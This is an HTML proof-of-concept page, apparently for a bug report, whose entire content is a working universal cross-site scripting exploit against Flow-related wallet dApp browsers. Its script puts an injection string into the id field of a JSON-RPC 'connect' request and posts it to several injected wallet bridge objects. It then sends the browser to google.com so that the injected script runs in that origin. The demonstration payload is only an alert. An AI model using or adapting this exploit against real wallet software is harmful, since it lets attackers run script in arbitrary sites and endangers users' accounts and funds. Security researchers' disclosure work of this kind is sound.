<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC UXSS Flow Wallet</title>
    <style>
        body { background: #000; color: #00ef8b; text-align: center; font-family: sans-serif; padding: 50px; }
        .btn { background: #00ef8b; color: #000; padding: 20px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; }
    </style>
</head>
<body>
    <h1>Flow dApp Browser Test</h1>
    <p>Gunakan tombol ini untuk memicu UXSS:</p>
    
    <button class="btn" onclick="triggerExploit()">CLICK TO BYPASS</button>

    <script>
        function triggerExploit() {
            // 1. Situs target (korban)
            const victimOrigin = "https://www.google.com";

            // 2. Payload jahat sesuai temuan bug
            // Menutup string asli: ");
            // Menjalankan alert: alert(origin);
            // Mematikan sisa kode: //
            const maliciousId = '");alert("UXSS Berhasil! \n\nOrigin: " + window.location.origin);//';

            const requestData = JSON.stringify({
                type: 'request',
                target: 'FuelContentScript',
                request: {
                    jsonrpc: '2.0',
                    id: maliciousId,
                    method: 'connect',
                    params: {}
                }
            });

            // 3. Cari semua kemungkinan objek dompet yang disuntikkan ke window
            const possibleBridges = [
                window.FueletWallet,   // Dari laporan aslinya
                window.flow,           // Standar Flow Wallet
                window.fcl,            // Flow Client Library
                window.ethereum,       // Sering digunakan dApp browser umum
                window.lilico,         // Nama lama Flow Wallet
                window.android         // Interface Android umum
            ];

            let success = false;
            possibleBridges.forEach(bridge => {
                if (bridge && typeof bridge.postMessage === 'function') {
                    bridge.postMessage(requestData);
                    success = true;
                }
            });

            if (success) {
                // 4. Navigasi cepat ke origin korban agar alert muncul di sana
                setTimeout(() => {
                    window.location.href = victimOrigin;
                }, 150);
            } else {
                alert("Kesalahan: Objek Wallet tidak terdeteksi. Silakan periksa di konsol.");
            }
        }
    </script>
</body>
</html>
